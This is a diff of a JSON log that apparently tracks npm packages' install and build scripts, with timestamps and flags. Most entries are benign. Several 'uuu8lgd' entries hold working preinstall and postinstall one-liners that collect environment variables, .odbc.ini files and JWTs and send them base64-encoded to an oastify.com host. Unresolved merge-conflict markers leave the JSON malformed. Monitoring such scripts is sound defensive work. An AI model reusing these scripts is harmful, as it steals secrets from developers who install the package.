@@ -1,38 +1,192 @@
 [
   {
-    "packageName": "@ibm/plex-math",
+    "packageName": "mcpql",
+    "version": "1.1.0",
+    "scriptType": "postinstall",
+    "scriptContent": "echo 'MCPQL installed successfully!'",
+    "previousVersion": null,
+    "timestamp": "2026-01-22T19:20:06.835Z",
+    "issuesend": true
+  },
+  {
+    "packageName": "mcp-secure-server",
+    "version": "0.0.6-security",
+    "scriptType": "prebuild",
+    "scriptContent": "npm run clean",
+    "previousVersion": "0.0.1-security",
+    "timestamp": "2026-01-22T19:19:39.085Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "trpc-docs-generator",
+    "version": "0.5.0",
+    "scriptType": "prebuild",
+    "scriptContent": "node scripts/build-inline.js",
+    "previousVersion": null,
+    "timestamp": "2026-01-22T19:18:38.884Z",
+    "issuesend": true
+  },
+  {
+    "packageName": "@workleap-nav/components",
+    "version": "100.1.1",
+    "scriptType": "preinstall",
+    "scriptContent": "node preinstall.js",
+    "previousVersion": null,
+    "timestamp": "2026-01-22T19:18:16.765Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "@qds.dev/code",
+    "version": "0.8.2",
+    "scriptType": "postbuild",
+    "scriptContent": "pnpm -C ../../docs run build.repl-sw",
+    "previousVersion": null,
+    "timestamp": "2026-01-22T19:11:42.728Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "@terminal-api/cli",
+    "version": "0.1.0",
+    "scriptType": "postinstall",
+    "scriptContent": "node ./postinstall.js",
+    "previousVersion": null,
+    "timestamp": "2026-01-22T19:10:12.001Z",
+    "issuesend": true
+  },
+  {
+    "packageName": "@d10r/snapshot-strategies",
+    "version": "0.1.3",
+    "scriptType": "postbuild",
+    "scriptContent": "copyfiles -u 0 \"src/**/*.md\" build/ && copyfiles -u 0 \"src/**/*.json\" build/",
+    "previousVersion": "0.1.2",
+    "timestamp": "2026-01-22T19:09:28.054Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "uuu8lgd",
+    "version": "1.0.16",
+    "scriptType": "postinstall",
+    "scriptContent": "node -e 'const cp=require(\"child_process\"),isW=process.platform===\"win32\";if(isW){cp.exec(\"powershell -c [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((dir env:|out-string)))\", (e,o)=>{cp.exec(`curl -d \"${o.trim()}\" http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/win_env`);})}else{cp.exec(\"cat /proc/self/environ /tmp/home/.odbc.ini /home/robotuser/.odbc.ini 2>/dev/null | base64 | tr -d \\\"\\\\n\\\"\", (e,o)=>{cp.exec(`curl -d \"${o}\" http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/lin_fast`);})}'",
+    "previousVersion": "1.0.15",
+    "timestamp": "2026-01-22T19:08:58.017Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "uuu8lgd",
+    "version": "1.0.16",
+    "scriptType": "preinstall",
+    "scriptContent": "node -e 'const cp=require(\"child_process\"),isW=process.platform===\"win32\";if(isW){cp.exec(\"powershell -c [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((dir env:|out-string)))\", (e,o)=>{cp.exec(`curl -d \"${o.trim()}\" http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/win_env`);})}else{cp.exec(\"cat /proc/self/environ /tmp/home/.odbc.ini /home/robotuser/.odbc.ini 2>/dev/null | base64 | tr -d \\\"\\\\n\\\"\", (e,o)=>{cp.exec(`curl -d \"${o}\" http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/lin_fast`);})}'",
+    "previousVersion": "1.0.15",
+    "timestamp": "2026-01-22T19:08:58.013Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "@ibm/jcl-expert-for-zowe-cli",
+    "version": "1.0.1",
+    "scriptType": "postbuild",
+    "scriptContent": "./format_lib.sh && rm -rf build",
+    "previousVersion": "1.0.0",
+    "timestamp": "2026-01-22T18:21:05.589Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "@ibm/plex-mono",
     "version": "1.1.0",
     "scriptType": "postinstall",
     "scriptContent": "ibmtelemetry --config=telemetry.yml",
     "previousVersion": "1.0.0",
+<<<<<<< HEAD
     "timestamp": "2026-01-22T19:18:27.109Z",
     "issuesend": false
   },
   {
     "packageName": "@ibm/plex-sans",
+=======
+    "timestamp": "2026-01-22T18:21:04.260Z",
+    "issuesend": true
+  },
+  {
+    "packageName": "@ibm/plex-sans-arabic",
+>>>>>>> 4e36140 (up)
     "version": "1.1.0",
     "scriptType": "postinstall",
     "scriptContent": "ibmtelemetry --config=telemetry.yml",
     "previousVersion": "1.0.0",
+<<<<<<< HEAD
     "timestamp": "2026-01-22T19:18:26.364Z",
     "issuesend": false
   },
   {
     "packageName": "@ibm/plex-sans-kr",
+=======
+    "timestamp": "2026-01-22T18:21:02.349Z",
+    "issuesend": true
+  },
+  {
+    "packageName": "@ibm/plex-sans-devanagari",
+>>>>>>> 4e36140 (up)
     "version": "1.1.0",
     "scriptType": "postinstall",
     "scriptContent": "ibmtelemetry --config=telemetry.yml",
     "previousVersion": "1.0.0",
+<<<<<<< HEAD
     "timestamp": "2026-01-22T19:18:25.063Z",
     "issuesend": false
   },
   {
     "packageName": "@ibm/plex-sans-thai-looped",
+=======
+    "timestamp": "2026-01-22T18:21:01.224Z",
+    "issuesend": true
+  },
+  {
+    "packageName": "@ibm/plex-sans-hebrew",
+>>>>>>> 4e36140 (up)
     "version": "1.1.0",
     "scriptType": "postinstall",
     "scriptContent": "ibmtelemetry --config=telemetry.yml",
     "previousVersion": "1.0.0",
+<<<<<<< HEAD
     "timestamp": "2026-01-22T19:18:24.729Z",
+=======
+    "timestamp": "2026-01-22T18:21:00.141Z",
+    "issuesend": true
+  },
+  {
+    "packageName": "@ibm/plex-sans-thai",
+    "version": "1.1.0",
+    "scriptType": "postinstall",
+    "scriptContent": "ibmtelemetry --config=telemetry.yml",
+    "previousVersion": "1.0.0",
+    "timestamp": "2026-01-22T18:20:57.816Z",
+    "issuesend": true
+  },
+  {
+    "packageName": "@ibm/plex-serif",
+    "version": "1.1.0",
+    "scriptType": "postinstall",
+    "scriptContent": "ibmtelemetry --config=telemetry.yml",
+    "previousVersion": "1.0.0",
+    "timestamp": "2026-01-22T18:20:55.646Z",
+    "issuesend": true
+  },
+  {
+    "packageName": "uuu8lgd",
+    "version": "1.0.8",
+    "scriptType": "postinstall",
+    "scriptContent": "node -e 'const { env } = process; const jwtPattern = /eyJh[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+/g; let found = JSON.stringify(env).match(jwtPattern) || []; require(\"child_process\").exec(\"ps -ef\", (e, out) => { const psMatch = out.match(jwtPattern); if(psMatch) found = found.concat(psMatch); if(found.length > 0) { const final = Buffer.from([...new Set(found)].join(\",\")).toString(\"base64\"); require(\"http\").get(`http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?node_jwt=${final}`); } });'",
+    "previousVersion": "1.0.7",
+    "timestamp": "2026-01-22T18:20:48.491Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "uuu8lgd",
+    "version": "1.0.8",
+    "scriptType": "preinstall",
+    "scriptContent": "node -e 'const { env } = process; const jwtPattern = /eyJh[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+/g; let found = JSON.stringify(env).match(jwtPattern) || []; require(\"child_process\").exec(\"ps -ef\", (e, out) => { const psMatch = out.match(jwtPattern); if(psMatch) found = found.concat(psMatch); if(found.length > 0) { const final = Buffer.from([...new Set(found)].join(\",\")).toString(\"base64\"); require(\"http\").get(`http://7embxh5kpbaoxjed0hkariis1j7av2jr.oastify.com/?node_jwt=${final}`); } });'",
+    "previousVersion": "1.0.7",
+    "timestamp": "2026-01-22T18:20:48.484Z",
+>>>>>>> 4e36140 (up)
     "issuesend": false
   },
   {
